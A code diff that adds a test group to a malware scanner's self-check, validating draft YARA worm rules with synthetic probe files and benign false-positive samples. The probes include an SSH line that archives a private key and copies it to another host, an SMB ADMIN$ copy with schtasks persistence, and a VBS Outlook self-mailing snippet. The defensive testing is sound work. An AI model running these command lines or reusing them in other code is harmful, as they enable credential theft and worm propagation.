@@ -1371,6 +1371,79 @@ def run(db):
     except Exception as exc:
         check("银狐多态泛化层", False, f"异常: {exc}")
 
+    # ==================== 第 32 组：蠕虫检测规则草案 ====================
+    # worms.yar 三条传播结构规则（SSH 凭证横移 / SMB 共享传播 / 邮件自群发）
+    # 的命中与误报边界验证，全部使用合成探针。
+    try:
+        if _gen_has_yara:
+            worm_dir = sample_dir / "worm_probes"
+            worm_dir.mkdir(exist_ok=True)
+            ctx_w = ScanContext(rules_paths=rules)
+
+            p_ssh = worm_dir / "ssh_worm.sh"
+            p_ssh.write_text(
+                "tar czf /tmp/.x.tgz ~/.ssh/id_rsa; cat /tmp/.k.pub "
+                ">> ~/.ssh/authorized_keys; scp -oStrictHostKeyChecking=no "
+                "/tmp/.x.tgz root@$next:/tmp/", encoding="utf-8")
+            h_ssh = [fd["name"] for fd in scan_file(p_ssh, db, ctx_w)]
+            check("蠕虫规则: SSH 凭证横移检出",
+                  "Worm_SSH_Propagation" in h_ssh, f"{h_ssh}")
+
+            p_smb = worm_dir / "smb_worm.bin"
+            p_smb.write_bytes(b"MZ" + b"\x90" * 60
+                              + b"copy self to \\\\ADMIN$\\system32.exe "
+                              + b"then schtasks /create /sc onstart"
+                              + b" /tn Updater /tr \\\\ADMIN$\\system32.exe")
+            h_smb = [fd["name"] for fd in scan_file(p_smb, db, ctx_w)]
+            check("蠕虫规则: SMB 共享传播检出",
+                  "Worm_Share_Propagation" in h_smb, f"{h_smb}")
+
+            p_mail = worm_dir / "mail_worm.vbs"
+            p_mail.write_text(
+                'Set o = CreateObject("Outlook.Application")\n'
+                "Set m = o.CreateItem(0)\n"
+                "m.Attachments.Add WScript.ScriptFullName\nm.Send",
+                encoding="utf-8")
+            h_mail = [fd["name"] for fd in scan_file(p_mail, db, ctx_w)]
+            check("蠕虫规则: 邮件自群发检出",
+                  "Worm_Email_Script" in h_mail, f"{h_mail}")
+
+            p_ans = worm_dir / "ansible.yml"
+            p_ans.write_text(
+                "- name: deploy key\n  copy: src=keys/ops.pub "
+                "dest=/home/ops/.ssh/authorized_keys mode=0644",
+                encoding="utf-8")
+            h_ans = [fd["name"] for fd in scan_file(p_ans, db, ctx_w)]
+            check("蠕虫规则: 配置管理不误报",
+                  not any(h.startswith("Worm_") for h in h_ans), f"{h_ans}")
+
+            p_ops = worm_dir / "ops_task.txt"
+            p_ops.write_text(
+                "schtasks /create /sc daily /tn Backup /tr C:\\backup\\run.cmd",
+                encoding="utf-8")
+            h_ops = [fd["name"] for fd in scan_file(p_ops, db, ctx_w)]
+            check("蠕虫规则: 运维脚本不误报",
+                  not any(h.startswith("Worm_") for h in h_ops), f"{h_ops}")
+
+            p_rep = worm_dir / "worm_report.txt"
+            p_rep.write_text(
+                "报告：蠕虫读取 id_rsa，写入 authorized_keys，使用 "
+                "Outlook.Application 群发，投递 \\\\ADMIN$ 并 schtasks 持久化。\n",
+                encoding="utf-8")
+            h_rep = [fd["name"] for fd in scan_file(p_rep, db, ctx_w)]
+            check("蠕虫规则: 报告文本不误报",
+                  not any(h.startswith("Worm_") for h in h_rep), f"{h_rep}")
+        else:
+            for nm in ("蠕虫规则: SSH 凭证横移检出",
+                       "蠕虫规则: SMB 共享传播检出",
+                       "蠕虫规则: 邮件自群发检出",
+                       "蠕虫规则: 配置管理不误报",
+                       "蠕虫规则: 运维脚本不误报",
+                       "蠕虫规则: 报告文本不误报"):
+                check(nm, True, "（未安装 yara-python，跳过）")
+    except Exception as exc:
+        check("蠕虫检测规则草案", False, f"异常: {exc}")
+
     ok_all = all(results)
     print(f"\n[i] 自检{'全部通过' if ok_all else '存在失败项'}。")
     return 0 if ok_all else 1
